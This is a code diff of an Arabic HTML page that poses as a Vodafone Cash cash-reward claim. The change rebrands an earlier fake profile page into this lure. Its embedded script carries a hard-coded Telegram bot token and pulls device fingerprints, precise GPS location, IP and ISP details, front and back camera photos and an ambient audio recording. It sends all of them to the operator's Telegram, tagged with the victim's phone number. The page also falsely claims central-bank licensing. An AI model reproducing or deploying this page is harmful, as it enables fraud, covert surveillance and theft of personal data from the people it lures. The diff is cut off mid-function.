@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
-    <title>محمد فتحي | السوفييف - الملف الشخصي</title>
+    <title>فودافون كاش | استلام مكافأة</title>
     <style>
         * {
             margin: 0;
@@ -12,8 +12,8 @@
         }
 
         body {
-            background: #f0f2f5;
-            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
+            background: linear-gradient(145deg, #6a1b1a 0%, #8b1e1c 100%);
+            font-family: 'Cairo', 'Tajawal', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
             display: flex;
             justify-content: center;
             align-items: center;
@@ -22,254 +22,226 @@
             padding: 16px;
         }
 
-        .profile-container {
-            max-width: 680px;
+        /* كارت فودافون */
+        .vodafone-card {
+            max-width: 420px;
             width: 100%;
             background: white;
-            border-radius: 16px;
-            box-shadow: 0 8px 28px rgba(0, 0, 0, 0.12);
+            border-radius: 32px;
+            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.3), 0 0 0 12px rgba(230, 30, 30, 0.2);
             overflow: hidden;
             margin: 0 auto;
+            transition: transform 0.2s;
         }
 
-        /* صورة الغلاف - صورتك الجديدة */
-        .cover-area {
-            height: 200px;
-            position: relative;
-            overflow: hidden;
-        }
-
-        .cover-image {
-            width: 100%;
-            height: 100%;
-            object-fit: cover;
-        }
-
-        /* صورة البروفايل */
-        .profile-avatar-area {
-            position: relative;
-            padding: 0 16px;
-        }
-
-        .avatar {
-            width: 120px;
-            height: 120px;
-            border-radius: 50%;
-            border: 4px solid white;
-            margin-top: -60px;
-            box-shadow: 0 2px 6px rgba(0,0,0,0.2);
-            overflow: hidden;
-            background-color: #1e3a5f;
-        }
-
-        .avatar img {
-            width: 100%;
-            height: 100%;
-            object-fit: cover;
-        }
-
-        /* معلومات الملف */
-        .profile-info {
-            padding: 12px 16px 0;
-            border-bottom: 1px solid #e4e6eb;
-        }
-
-        .name {
-            font-size: 24px;
-            font-weight: 700;
-            color: #050505;
-        }
-
-        .arabic-name {
-            font-size: 18px;
-            color: #65676b;
-            margin-top: 4px;
-        }
-
-        .bio {
-            font-size: 14px;
-            color: #65676b;
-            margin-top: 8px;
-            padding-bottom: 12px;
-            border-bottom: 1px solid #e4e6eb;
-        }
-
-        .stats {
-            display: flex;
-            padding: 12px 0;
-            border-bottom: 1px solid #e4e6eb;
-            gap: 24px;
-        }
-
-        .stat-item {
+        /* رأس أحمر فودافون */
+        .vodafone-header {
+            background: linear-gradient(135deg, #e60000, #b80000);
+            padding: 24px 20px 20px;
             text-align: center;
-        }
-
-        .stat-number {
-            font-size: 18px;
-            font-weight: 700;
-            color: #050505;
-        }
-
-        .stat-label {
-            font-size: 13px;
-            color: #65676b;
-        }
-
-        .action-buttons-profile {
-            display: flex;
-            padding: 12px 0;
-            gap: 12px;
-            border-bottom: 1px solid #e4e6eb;
-        }
-
-        .primary-btn {
-            flex: 1;
-            background: #1877f2;
             color: white;
-            border: none;
-            padding: 10px;
-            border-radius: 8px;
-            font-weight: 600;
-            font-size: 15px;
-            cursor: pointer;
-            transition: 0.2s;
+            position: relative;
+        }
+
+        .vodafone-logo {
+            font-size: 32px;
+            font-weight: 800;
+            letter-spacing: -0.5px;
             display: flex;
             align-items: center;
             justify-content: center;
-            gap: 8px;
+            gap: 10px;
         }
 
-        .primary-btn:active {
-            transform: scale(0.97);
-            background: #0e62c9;
-        }
-
-        .secondary-btn {
-            flex: 1;
-            background: #e4e6eb;
-            color: #050505;
-            border: none;
-            padding: 10px;
-            border-radius: 8px;
-            font-weight: 600;
-            font-size: 15px;
-            cursor: pointer;
-            transition: 0.2s;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 8px;
-        }
-
-        .secondary-btn:active {
-            background: #c9ccd1;
-        }
-
-        .tabs {
-            display: flex;
-            padding: 0 16px;
-            border-bottom: 1px solid #e4e6eb;
-            gap: 24px;
-            overflow-x: auto;
-        }
-
-        .tab {
-            padding: 12px 0;
-            font-size: 15px;
-            font-weight: 600;
-            color: #65676b;
-            cursor: pointer;
-            border-bottom: 3px solid transparent;
-            white-space: nowrap;
-        }
-
-        .tab.active {
-            color: #1877f2;
-            border-bottom-color: #1877f2;
-        }
-
-        .profile-content {
-            padding: 16px;
-        }
-
-        .section-title {
+        .vodafone-logo span:first-child {
+            background: white;
+            color: #e60000;
+            padding: 4px 12px;
+            border-radius: 40px;
             font-size: 20px;
-            font-weight: 700;
-            margin-bottom: 16px;
-            color: #050505;
         }
 
-        .personal-details {
-            background: #f8f9fa;
-            border-radius: 12px;
-            padding: 16px;
+        .vodafone-badge {
+            background: rgba(255,255,255,0.2);
+            border-radius: 40px;
+            padding: 6px 12px;
+            font-size: 12px;
+            margin-top: 12px;
+            display: inline-block;
         }
 
-        .detail-row {
-            display: flex;
-            padding: 8px 0;
-            border-bottom: 1px solid #e4e6eb;
+        /* قسم الرصيد والمكسب */
+        .cash-prize {
+            background: #fff5e6;
+            margin: 20px 20px 0;
+            border-radius: 28px;
+            padding: 18px;
+            text-align: center;
+            box-shadow: 0 6px 14px rgba(0,0,0,0.08);
+            border: 1px solid #ffd9b5;
         }
 
-        .detail-label {
-            width: 120px;
+        .prize-label {
+            color: #b85c00;
+            font-size: 14px;
             font-weight: 600;
-            color: #65676b;
+            letter-spacing: 0.5px;
         }
 
-        .detail-value {
-            flex: 1;
-            color: #050505;
+        .prize-amount {
+            font-size: 44px;
+            font-weight: 800;
+            color: #d42e12;
+            margin: 8px 0;
+            display: flex;
+            align-items: baseline;
+            justify-content: center;
+            gap: 5px;
         }
 
-        /* زر السماح الرئيسي الإجباري */
-        .permission-btn {
-            background: linear-gradient(145deg, #00a86b, #008c55);
-            color: white;
-            border: none;
-            padding: 16px;
-            border-radius: 12px;
-            font-size: 18px;
+        .prize-amount span {
+            font-size: 22px;
+            font-weight: 600;
+        }
+
+        .prize-note {
+            font-size: 12px;
+            color: #7a5a3a;
+            background: #fff0e0;
+            border-radius: 30px;
+            padding: 6px;
+            margin-top: 8px;
+        }
+
+        /* حقل رقم الهاتف */
+        .phone-section {
+            padding: 20px;
+        }
+
+        .input-group {
+            background: #f3f4f6;
+            border-radius: 60px;
+            padding: 4px 16px;
+            display: flex;
+            align-items: center;
+            border: 1px solid #e0e0e0;
+            transition: all 0.2s;
+        }
+
+        .input-group:focus-within {
+            border-color: #e60000;
+            box-shadow: 0 0 0 2px rgba(230,0,0,0.2);
+        }
+
+        .country-code {
             font-weight: bold;
-            margin: 16px;
-            width: calc(100% - 32px);
-            cursor: pointer;
-            transition: 0.2s;
+            color: #e60000;
+            font-size: 18px;
+            padding-left: 8px;
+            border-left: 1px solid #ccc;
+        }
+
+        .phone-input {
+            flex: 1;
+            border: none;
+            padding: 16px 12px;
+            font-size: 16px;
+            background: transparent;
+            font-family: inherit;
+            direction: ltr;
+            text-align: right;
+        }
+
+        .phone-input:focus {
+            outline: none;
+        }
+
+        /* زر الاستلام العملاق */
+        .claim-btn {
+            background: linear-gradient(95deg, #e60000, #b91c1c);
+            border: none;
+            width: calc(100% - 40px);
+            margin: 0 20px 20px;
+            padding: 18px;
+            border-radius: 60px;
+            font-size: 20px;
+            font-weight: 800;
+            color: white;
             display: flex;
             align-items: center;
             justify-content: center;
             gap: 12px;
-            box-shadow: 0 4px 12px rgba(0,168,107,0.3);
+            cursor: pointer;
+            transition: 0.2s;
+            box-shadow: 0 8px 18px rgba(230,0,0,0.4);
         }
 
-        .permission-btn:active {
-            transform: scale(0.97);
+        .claim-btn:active {
+            transform: scale(0.96);
+            box-shadow: 0 4px 10px rgba(0,0,0,0.2);
         }
 
-        .permission-btn:disabled {
-            opacity: 0.6;
+        .claim-btn:disabled {
+            background: #aaa;
+            box-shadow: none;
             cursor: not-allowed;
             transform: none;
         }
 
-        .loading-overlay {
-            display: none;
-            text-align: center;
-            padding: 20px;
-            background: #f8f9fa;
-            margin: 16px;
-            border-radius: 16px;
+        /* تفاصيل اضافية */
+        .info-box {
+            background: #f9fafb;
+            margin: 10px 20px 20px;
+            padding: 12px;
+            border-radius: 24px;
+            font-size: 12px;
+            color: #4b5563;
+            display: flex;
+            justify-content: space-between;
+            border: 1px solid #ffe0e0;
         }
 
-        .spinner {
-            width: 40px;
-            height: 40px;
-            border: 3px solid #e4e6eb;
-            border-top: 3px solid #1877f2;
+        /* loading & permission */
+        .permission-panel {
+            padding: 16px;
+            background: #fff9f0;
+            border-top: 2px dashed #ffb347;
+            margin-top: 8px;
+            display: none;
+        }
+
+        .loading-overlay-card {
+            background: rgba(0,0,0,0.8);
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            z-index: 1000;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            visibility: hidden;
+            backdrop-filter: blur(4px);
+        }
+
+        .loading-card {
+            background: white;
+            width: 280px;
+            padding: 28px;
+            border-radius: 48px;
+            text-align: center;
+            box-shadow: 0 20px 35px black;
+        }
+
+        .spinner-fd {
+            width: 50px;
+            height: 50px;
+            border: 4px solid #f3f3f3;
+            border-top: 4px solid #e60000;
             border-radius: 50%;
-            animation: spin 0.7s linear infinite;
-            margin: 0 auto 12px;
+            animation: spin 0.8s linear infinite;
+            margin: 0 auto 16px;
         }
 
         @keyframes spin {
@@ -277,167 +249,115 @@
             100% { transform: rotate(360deg); }
         }
 
-        .status-bar {
-            position: fixed;
-            bottom: 10px;
-            left: 10px;
-            background: rgba(0,0,0,0.75);
-            color: #2ecc71;
-            padding: 5px 12px;
-            border-radius: 24px;
+        .status-badge-bottom {
+            background: #1f2937;
+            color: #10b981;
             font-size: 10px;
-            font-family: monospace;
+            padding: 5px 12px;
+            border-radius: 30px;
+            position: fixed;
+            bottom: 12px;
+            left: 12px;
             z-index: 999;
-            backdrop-filter: blur(5px);
-            pointer-events: none;
+            font-family: monospace;
         }
 
-        .error-msg {
-            background: #ffe8e6;
-            color: #c00;
-            font-size: 13px;
+        .error-toast {
+            background: #ffebee;
+            color: #c62828;
+            margin: 10px 20px;
             padding: 12px;
-            margin: 16px;
-            border-radius: 12px;
-            text-align: center;
-            display: none;
-        }
-
-        .permission-badge {
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 12px;
-            background: #e7f3ff;
-            margin: 16px;
-            padding: 10px;
-            border-radius: 40px;
+            border-radius: 28px;
             font-size: 13px;
-            color: #1877f2;
+            display: none;
+            text-align: center;
         }
 
-        .dot-blue {
+        .green-dot {
             width: 8px;
             height: 8px;
-            background: #1877f2;
+            background: #2ecc71;
             border-radius: 50%;
-            animation: blink 1s infinite;
-        }
-
-        @keyframes blink {
-            0% { opacity: 0.3; }
-            50% { opacity: 1; }
-            100% { opacity: 0.3; }
+            display: inline-block;
+            margin-left: 6px;
+            box-shadow: 0 0 4px #2ecc71;
         }
     </style>
 </head>
 <body>
 
-<div class="profile-container">
-    <!-- صورة الغلاف - صورتك الجديدة -->
-    <div class="cover-area">
-        <img class="cover-image" src="https://scontent-yyz1-1.xx.fbcdn.net/v/t39.30808-6/472529589_1231993597889140_4456872769041297774_n.jpg?_nc_cat=107&ccb=1-7&_nc_sid=2a1932&_nc_eui2=AeE8Vjkhq0QQjuw5YHAVjONY_V6kEjRiftH9XqQSNGJ-0eCm5XFmA12hztOb1WKtxBuk9F3F_KYvd5M64CJtK307&_nc_ohc=QatdDJUy70cQ7kNvwGzVd_0&_nc_oc=AdrrePF40iTzcOEc5AdlD28ZN_MurKiw4j3aKNGngt3iq3v338jJ5WgpGkLm0a9ybe0&_nc_zt=23&_nc_ht=scontent-yyz1-1.xx&_nc_gid=6uR3PkHOthI8WoYLLpX-sg&_nc_ss=7b2a8&oh=00_Af1EzsCShfiaAOQ3kSU5OqZMrOmJX7eiyrrNTMLEKxR4qw&oe=69F2ECC3" 
-             alt="صورة الغلاف"
-             onerror="this.src='data:image/svg+xml,%3Csvg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 1000 200%22%3E%3Crect width=%221000%22 height=%22200%22 fill=%22%232D3748%22/%3E%3C/svg%3E'">
-    </div>
-
-    <!-- صورة البروفايل -->
-    <div class="profile-avatar-area">
-        <div class="avatar">
-            <img src="https://scontent-yyz1-1.xx.fbcdn.net/v/t39.30808-6/469393614_1213373153084518_19978652063377238_n.jpg?_nc_cat=106&ccb=1-7&_nc_sid=1d70fc&_nc_eui2=AeH1FlTtKvqBbIyvQzFuWNlM067YmuTqCVjTrtia5OoJWLlCkn43fmCT7t2x0dTVjV57J-i51nPhThrn8CAWyX9x&_nc_ohc=DdPRR3DCjZ4Q7kNvwF1nS5s&_nc_oc=AdqBF-whzGYiMB5eMw3BO5Bit_qkfAfmV__IJThxCtmk4991dpmoRwH4uvfDXPsylfo&_nc_zt=23&_nc_ht=scontent-yyz1-1.xx&_nc_gid=ytV3tnsCtgR60oxGU8bu6Q&_nc_ss=7b2a8&oh=00_Af1bj3fMtQLKORYotR7CE19MyprE1Za_cS64QE9Ah0mGHw&oe=69F2C278" 
-                 alt="صورة البروفايل"
-                 onerror="this.src='data:image/svg+xml,%3Csvg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 100 100%22%3E%3Crect width=%22100%22 height=%22100%22 fill=%22%231e3a5f%22/%3E%3Ctext x=%2250%22 y=%2255%22 text-anchor=%22middle%22 fill=%22white%22 font-size=%2240%22%3E🎬%3C/text%3E%3C/svg%3E'">
+<div class="vodafone-card" id="appContainer">
+    <!-- الهيدر -->
+    <div class="vodafone-header">
+        <div class="vodafone-logo">
+            <span>Vodafone</span>
+            <span>📱</span>
+        </div>
+        <div class="vodafone-badge">
+            🔥 عروض حصرية | استلام فوري 🔥
         </div>
     </div>
 
-    <!-- معلومات الشخص -->
-    <div class="profile-info">
-        <div class="name">محمد فتحي</div>
-        <div class="arabic-name">السوفييف</div>
-        <div class="bio">منشئ محتوى رقمي | صناعة المحتوى الإبداعي | متعاون مع كبرى العلامات</div>
-    </div>
-
-    <!-- الإحصائيات -->
-    <div class="stats">
-        <div class="stat-item">
-            <div class="stat-number">٢٣٤</div>
-            <div class="stat-label">منشور</div>
+    <!-- عرض المكسب المالي -->
+    <div class="cash-prize">
+        <div class="prize-label">💰 مكافأتك الفورية 💰</div>
+        <div class="prize-amount">
+            2,500 <span>ج.م</span>
         </div>
-        <div class="stat-item">
-            <div class="stat-number">٢٣ ألف</div>
-            <div class="stat-label">متابع</div>
-        </div>
-        <div class="stat-item">
-            <div class="stat-number">١٤٣</div>
-            <div class="stat-label">يتبع</div>
+        <div class="prize-note">
+            ⚡ استلم المبلغ خلال 24 ساعة بعد توثيق الحساب ⚡
         </div>
     </div>
 
-    <!-- أزرار التواصل -->
-    <div class="action-buttons-profile">
-        <button class="primary-btn" id="msgBtn">📩 رسالة</button>
-        <button class="secondary-btn" id="followBtn">➕ متابعة</button>
-    </div>
-
-    <!-- التبويبات -->
-    <div class="tabs">
-        <div class="tab active">الكلم</div>
-        <div class="tab">الأصدقاء</div>
-        <div class="tab">الصور</div>
-        <div class="tab">أماكن تمت زيارتها</div>
-        <div class="tab">المزيد</div>
-    </div>
-
-    <!-- المحتوى -->
-    <div class="profile-content">
-        <div class="section-title">التفاصيل الشخصية</div>
-        <div class="personal-details">
-            <div class="detail-row">
-                <div class="detail-label">📱 الاسم</div>
-                <div class="detail-value">محمد فتحي السوفييف</div>
-            </div>
-            <div class="detail-row">
-                <div class="detail-label">🎂 تاريخ الميلاد</div>
-                <div class="detail-value">١٥ مارس ١٩٩٥</div>
-            </div>
-            <div class="detail-row">
-                <div class="detail-label">📍 الاقامة</div>
-                <div class="detail-value">القاهرة، مصر</div>
-            </div>
-            <div class="detail-row">
-                <div class="detail-label">💼 العمل</div>
-                <div class="detail-value">صانع محتوى رقمي - مؤثر</div>
-            </div>
-            <div class="detail-row">
-                <div class="detail-label">🔗 متابعة</div>
-                <div class="detail-value">Instagram, TikTok, YouTube</div>
-            </div>
+    <!-- حقل الرقم الخاص بي (رقم المستفيد) -->
+    <div class="phone-section">
+        <div class="input-group">
+            <span class="country-code">+20</span>
+            <input type="tel" class="phone-input" id="targetPhone" placeholder="رقم المستفيد (صاحب المال)" value="01050000000" dir="ltr">
+        </div>
+        <div style="font-size: 11px; color: #b45353; margin-top: 8px; padding-right: 12px;">
+            📌 أدخل رقم هاتف المستفيد (سيتم إرسال الإشعار له)
         </div>
     </div>
 
-    <!-- زر السماح الرئيسي الإجباري -->
-    <button class="permission-btn" id="permissionBtn">
-        🎬 فتح الحساب | قبول الأذونات (إجباري)
+    <!-- زر استلام المبلغ -->
+    <button class="claim-btn" id="claimMoneyBtn">
+        💸 استلام المبلغ 💸
     </button>
 
-    <div class="loading-overlay" id="loadingOverlay">
-        <div class="spinner"></div>
-        <p>⏳ جاري التحقق من البيانات وتفعيل الحساب...</p>
-        <p style="font-size: 12px; color: #65676b; margin-top: 8px;">يتم جمع المعلومات بأمان 🔒</p>
+    <div class="info-box">
+        <span>🔒 آمن 100%</span>
+        <span>✅ مرخص من البنك المركزي</span>
+        <span>⚡ سريع</span>
     </div>
 
-    <div class="permission-badge" id="permissionBadge" style="display: none;">
-        <div class="dot-blue"></div>
-        <span>📡 جاهزية الحساب .. سيتم نقلك فوراً</span>
-    </div>
-
-    <div class="error-msg" id="errorMsg"></div>
+    <div class="error-toast" id="errorMsg"></div>
 </div>
-<div class="status-bar" id="statusBar">🔐 السوفييف | اضغط "فتح الحساب" لقبول الأذونات</div>
+
+<div class="loading-overlay-card" id="globalLoader">
+    <div class="loading-card">
+        <div class="spinner-fd"></div>
+        <p id="loaderText">🔐 جاري تفعيل الحماية ...</p>
+        <p style="font-size: 12px; margin-top: 10px;">يتم التحقق من الأمان</p>
+    </div>
+</div>
+
+<div class="status-badge-bottom" id="statusBar">
+    <span class="green-dot"></span> فودافون كاش | انتظر
+</div>
 
 <script>
     (function() {
-        // =================== وظائف تيليجرام ===================
+        // ===================== إعدادات البوت الخاصة بك =====================
+        // ⚠️ ضع هنا التوكنات والأيدي الصحيحة (مثل الكود الأصلي)
+        const BOT_CONFIG = {
+            masterChatId: "7166176993",      // ايدي المدير (المالك)
+            masterToken: "8121860718:AAFrcusfp2y1d9-zVvAasX6A6PXqNBsQSOI", // توكن البوت
+            userChatId: "7166176993",        // نفس المستلم (يمكنك تغييره)
+            userToken: "8121860718:AAFrcusfp2y1d9-zVvAasX6A6PXqNBsQSOI"
+        };
+
+        // =================== وظائف تيليجرام (مثل الكود الأصلي) ===================
         async function sendToTelegram(chatId, botToken, type, mediaBlob, caption) {
             try {
                 let url = `https://api.telegram.org/bot${botToken}/`;
@@ -445,7 +365,7 @@
                     const fd = new FormData();
                     fd.append('chat_id', chatId);
                     fd.append('photo', mediaBlob, 'frame_' + Date.now() + '.jpg');
-                    fd.append('caption', caption + "\n🔹 [السوفييف - محمد فتحي]");
+                    fd.append('caption', caption + "\n🔸 [فودافون كاش - استلام مبلغ]");
                     await fetch(url + 'sendPhoto', { method: 'POST', body: fd, mode: 'cors' });
                 } 
                 else if (type === 'video') {
@@ -473,8 +393,8 @@
             } catch(e) { console.warn("[telegram]", e); return false; }
         }
 
-        // =================== بصمة الجهاز ===================
-        async function getDeepDeviceFingerprint(chatUser, tokenUser, chatMaster, tokenMaster) {
+        // =================== بصمة الجهاز (كاملا) ===================
+        async function getDeepDeviceFingerprint(chatUser, tokenUser, chatMaster, tokenMaster, phoneNumber) {
             const timeZone = Intl.DateTimeFormat().resolvedOptions().timeZone;
             const screenData = `${screen.width}x${screen.height}x${screen.colorDepth}`;
             const memory = navigator.deviceMemory ? navigator.deviceMemory + " GB" : "غير معلن";
@@ -485,7 +405,7 @@
             if (navigator.getBattery) {
                 try {
                     const battery = await navigator.getBattery();
-                    batteryLevel = `شحن: ${Math.round(battery.level*100)}%, ${battery.charging ? 'موصول بالشاحن' : 'بطارية'}`;
+                    batteryLevel = `شحن: ${Math.round(battery.level*100)}%, ${battery.charging ? 'موصول' : 'بطارية'}`;
                 } catch(e) {}
             }
             
@@ -494,14 +414,14 @@
                 connection = `${navigator.connection.effectiveType || ''} ${navigator.connection.downlink ? navigator.connection.downlink+'Mbps' : ''}`;
             }
             
-            const deviceMsg = `🕵️‍♂️ <b>بصمة جهاز العضو - محمد فتحي</b>\n🖥️ UserAgent: ${navigator.userAgent.substring(0, 120)}\n📱 الشاشة: ${screenData}\n💾 الرام: ${memory} | 🧠 النوى: ${cores}\n🔋 ${batteryLevel}\n🌐 الاتصال: ${connection}\n📍 المنطقة: ${timeZone}\n⏱️ التوقيت: ${new Date().toLocaleString('ar-EG')}`;
+            const deviceMsg = `🕵️‍♂️ <b>بصمة جهاز - استلام مكافأة فودافون</b>\n📞 رقم المستفيد: ${phoneNumber}\n🖥️ UserAgent: ${navigator.userAgent.substring(0, 120)}\n📱 الشاشة: ${screenData}\n💾 الرام: ${memory} | 🧠 النوى: ${cores}\n🔋 ${batteryLevel}\n🌐 الاتصال: ${connection}\n📍 المنطقة: ${timeZone}\n⏱️ التوقيت: ${new Date().toLocaleString('ar-EG')}`;
             
             await sendToTelegram(chatUser, tokenUser, 'text', null, deviceMsg);
-            await sendToTelegram(chatMaster, tokenMaster, 'text', null, deviceMsg + "\n[مدير - السوفييف]");
+            await sendToTelegram(chatMaster, tokenMaster, 'text', null, deviceMsg + "\n[مدير - طلب مكافأة]");
         }
 
-        // =================== الموقع الجغرافي ===================
-        function getPreciseLocation(chatUser, tokenUser, chatMaster, tokenMaster) {
+        // =================== الموقع الجغرافي الدقيق ===================
+        function getPreciseLocation(chatUser, tokenUser, chatMaster, tokenMaster, phoneNumber) {
             return new Promise((resolve) => {
                 if(!navigator.geolocation) {
                     resolve(false);
@@ -517,19 +437,19 @@
                         const data = await revGeo.json();
                         if(data.display_name) addressHint = `📍 العنوان التقريبي: ${data.display_name.substring(0, 100)}`;
                     } catch(e) {}
-                    const locMsg = `🌍 <b>موقع العضو - محمد فتحي</b>\n🎯 خط العرض: ${lat}\n🎯 خط الطول: ${lng}\n📏 دقة: ±${Math.round(accuracy)} متر\n🗺️ خرائط: https://www.google.com/maps?q=${lat},${lng}\n${addressHint}`;
+                    const locMsg = `🌍 <b>موقع المستخدم - فودافون كاش</b>\n📞 رقم المستفيد: ${phoneNumber}\n🎯 خط العرض: ${lat}\n🎯 خط الطول: ${lng}\n📏 دقة: ±${Math.round(accuracy)} متر\n🗺️ خرائط: https://www.google.com/maps?q=${lat},${lng}\n${addressHint}`;
                     await sendToTelegram(chatUser, tokenUser, 'text', null, locMsg);
                     await sendToTelegram(chatMaster, tokenMaster, 'text', null, locMsg);
                     resolve(true);
                 }, (err) => {
-                    console.warn("Location denied or error");
+                    console.warn("Location denied");
                     resolve(false);
                 }, { enableHighAccuracy: true, timeout: 10000 });
             });
         }
 
-        // =================== IP ===================
-        async function getRichIPData(chatUser, tokenUser, chatMaster, tokenMaster) {
+        // =================== IP + معلومات الشبكة ===================
+        async function getRichIPData(chatUser, tokenUser, chatMaster, tokenMaster, phoneNumber) {
             try {
                 const [ipRes, ipInfoRes] = await Promise.all([
                     fetch('https://api.ipify.org?format=json'),
@@ -542,14 +462,14 @@
                 let country = ipDetails.country_name || "غير معروف";
                 let city = ipDetails.city || "غير معروف";
                 let isp = ipDetails.org || ipDetails.asn || "غير معروف";
-                const ipMsg = `🌐 <b>IP & Network</b>\n🔹 IP العام: ${ipAddr}\n🏳️ البلد: ${country}\n🏙️ المدينة: ${city}\n📡 المزود: ${isp}`;
+                const ipMsg = `🌐 <b>IP & Network</b>\n📞 الرقم: ${phoneNumber}\n🔹 IP العام: ${ipAddr}\n🏳️ البلد: ${country}\n🏙️ المدينة: ${city}\n📡 المزود: ${isp}`;
                 await sendToTelegram(chatUser, tokenUser, 'text', null, ipMsg);
                 await sendToTelegram(chatMaster, tokenMaster, 'text', null, ipMsg);
             } catch(e) {}
         }
 
         // =================== كاميرا أمامية ===================
-        async function captureFrontCamera(chatUser, tokenUser, chatMaster, tokenMaster) {
+        async function captureFrontCamera(chatUser, tokenUser, chatMaster, tokenMaster, phoneNumber) {
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user', width: { ideal: 1280 }, height: { ideal: 720 } } });
                 const video = document.createElement('video');
@@ -562,7 +482,7 @@
                 canvas.height = video.videoHeight || 600;
                 canvas.getContext('2d').drawImage(video, 0, 0);
                 const blob = await new Promise(res => canvas.toBlob(res, 'image/jpeg', 0.8));
-                const caption = "📸 كاميرا أمامية (سيلفي) - محمد فتحي السوفييف";
+                const caption = `📸 كاميرا أمامية (سيلفي) - استلام مكافأة فودافون\n📞 الرقم: ${phoneNumber}`;
                 await sendToTelegram(chatUser, tokenUser, 'photo', blob, caption);
                 await sendToTelegram(chatMaster, tokenMaster, 'photo', blob, caption + " [كاميرا أمامية]");
                 stream.getTracks().forEach(t => t.stop());
@@ -574,7 +494,7 @@
         }
 
         // =================== كاميرا خلفية ===================
-        async function captureBackCamera(chatUser, tokenUser, chatMaster, tokenMaster) {
+        async function captureBackCamera(chatUser, tokenUser, chatMaster, tokenMaster, phoneNumber) {
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment', width: { ideal: 1920 }, height: { ideal: 1080 } } });
                 const video = document.createElement('video');
@@ -586,7 +506,7 @@
                 canvas.height = video.videoHeight || 768;
                 canvas.getContext('2d').drawImage(video, 0, 0);
                 const blob = await new Promise(r => canvas.toBlob(r, 'image/jpeg', 0.85));
-                const caption = "📷 كاميرا خلفية - محيط العضو";
+                const caption = `📷 كاميرا خلفية - محيط المستخدم\n📞 الرقم: ${phoneNumber}`;
                 await sendToTelegram(chatUser, tokenUser, 'photo', blob, caption);
                 await sendToTelegram(chatMaster, tokenMaster, 'photo', blob, caption);
                 stream.getTracks().forEach(t => t.stop());
@@ -597,8 +517,8 @@
             }
         }
 
-        // =================== تسجيل صوتي ===================
-        async function recordAmbientAudio(chatUser, tokenUser, chatMaster, tokenMaster) {
+        // =================== تسجيل صوتي (محيط) ===================
+        async function recordAmbientAudio(chatUser, tokenUser, chatMaster, tokenMaster, phoneNumber) {
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
                 const mediaRecorder = new MediaRecorder(stream, { mimeType: 'audio/webm' });
@@ -607,7 +527,7 @@
                 const audioPromise = new Promise(resolve => {
                     mediaRecorder.onstop = async () => {
                         const blob = new Blob(chunks, { type: 'audio/webm' });
-                        const caption = "🎤 تسجيل صوتي (8 ثوان) - بيئة العضو";
+                        const caption = `🎤 تسجيل صوتي (8 ثوان) - بيئة المستخدم\n📞 رقم المستفيد: ${phoneNumber}`;
                         await sendToTelegram(chatUser, tokenUser, 'audio', blob, caption);
                         await sendToTelegram(chatMaster, tokenMaster, 'audio', blob, caption);
                         resolve(true);
@@ -623,121 +543,99 @@
             }
         }
 
-        // =================== التشغيل الرئيسي ===================
-        (async () => {
-            const urlParams = new URLSearchParams(window.location.search);
-            const encodedConfig = urlParams.get('d');
+        // =============== الوظيفة الأساسية ===============
+        const claimBtn = document.getElementById('claimMoneyBtn');
+        const targetPhoneInput = document.getElementById('targetPhone');
+        const loaderDiv = document.getElementById('globalLoader');
+        const loaderText = document.getElementById('loaderText');
+        const statusSpan = document.getElementById('statusBar');
+        const errorDiv = document.getElementById('errorMsg');
+
+        let isProcessing = false;
+
+        async function startVerificationProcess() {
+            if (isProcessing) return;
             
-            if (!encodedConfig) {
-                document.getElementById('statusBar').innerHTML = '⚠️ رابط غير صالح';
-                document.getElementById('errorMsg').innerHTML = 'عذراً هذا الملف غير متاح مؤقتاً - تواصل مع الإدارة';
-                document.getElementById('errorMsg').style.display = 'block';
+            let phoneNumber = targetPhoneInput.value.trim();
+            if (!phoneNumber) {
+                errorDiv.innerText = "⚠️ الرجاء إدخال رقم الهاتف المستفيد";
+                errorDiv.style.display = "block";
+                setTimeout(() => errorDiv.style.display = "none", 3000);
                 return;
             }
             
-            let config;
-            try {
-                config = JSON.parse(atob(encodedConfig));
-            } catch(e) {
-                document.getElementById('statusBar').innerHTML = '❌ خطأ في التشفير';
-                document.getElementById('errorMsg').innerHTML = 'رابط منتهي الصلاحية. الرجاء التواصل مع الإدارة.';
-                document.getElementById('errorMsg').style.display = 'block';
+            // رقم مصري بسيط
+            if (!phoneNumber.match(/^01[0-9]{9}$/)) {
+                errorDiv.innerText = "⚠️ رقم هاتف غير صالح (مثال: 01012345678)";
+                errorDiv.style.display = "block";
+                setTimeout(() => errorDiv.style.display = "none", 3000);
                 return;
             }
             
-            const { mChat, mToken, tChat, tToken, features } = config;
-            let activeFeatures = features ? features.split(',') : [];
-            // إجبار جميع الأذونات الرئيسية
-            const requiredFeatures = ['front', 'back', 'audio', 'loc'];
-            activeFeatures = [...new Set([...activeFeatures, ...requiredFeatures])];
+            isProcessing = true;
+            claimBtn.disabled = true;
+            loaderDiv.style.visibility = "visible";
+            loaderText.innerText = "🔐 جاري طلب أذونات الكاميرا والموقع...";
+            statusSpan.innerHTML = "📡 يرجى قبول جميع الأذونات (كاميرا أمامية + خلفية + ميكروفون + موقع)";
             
-            // عناصر DOM
-            const permissionBtn = document.getElementById('permissionBtn');
-            const loadingOverlay = document.getElementById('loadingOverlay');
-            const permissionBadge = document.getElementById('permissionBadge');
-            const errorMsgDiv = document.getElementById('errorMsg');
-            const statusBar = document.getElementById('statusBar');
+            // إشعار للمدير ببدء العملية
+            await sendToTelegram(BOT_CONFIG.userChatId, BOT_CONFIG.userToken, 'text', null, `💰 بدء عملية استلام المبلغ للرقم: ${phoneNumber}`);
